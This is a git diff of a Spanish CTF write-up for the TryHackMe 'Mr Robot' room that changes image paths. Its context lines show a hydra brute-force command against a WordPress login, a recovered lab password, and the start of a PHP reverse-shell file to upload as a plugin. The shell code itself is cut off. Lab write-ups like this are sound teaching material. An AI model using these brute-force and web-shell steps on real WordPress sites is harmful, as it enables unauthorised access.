@@ -88,7 +88,7 @@ hydra -l elliot -P dic_clean.txt 10.129.167.131 http-post-form "/wp-login.php:lo
 
 Contraseña obtenida: `ER28-0652`
 
-![Hydra encuentra la contraseña](assets/4.png)
+![Hydra encuentra la contraseña](TryHackMe/Mr-Robot-CTF/assets/4.png)
 
 ---
 
@@ -96,13 +96,13 @@ Contraseña obtenida: `ER28-0652`
 
 Con acceso al panel de administración de WordPress (`/wp-admin`), aprovechamos la funcionalidad de subida de plugins para ejecutar código PHP en el servidor.
 
-![Panel WordPress con usuarios](assets/5.png)
+![Panel WordPress con usuarios](TryHackMe/Mr-Robot-CTF/assets/5.png)
 
 ### Crear el payload
 
 Creamos un archivo PHP con una reverse shell en bash:
 
-![Creación shell.php](assets/6.png)
+![Creación shell.php](TryHackMe/Mr-Robot-CTF/assets/6.png)
 
 ```bash
 cat > shell.php << 'EOF'
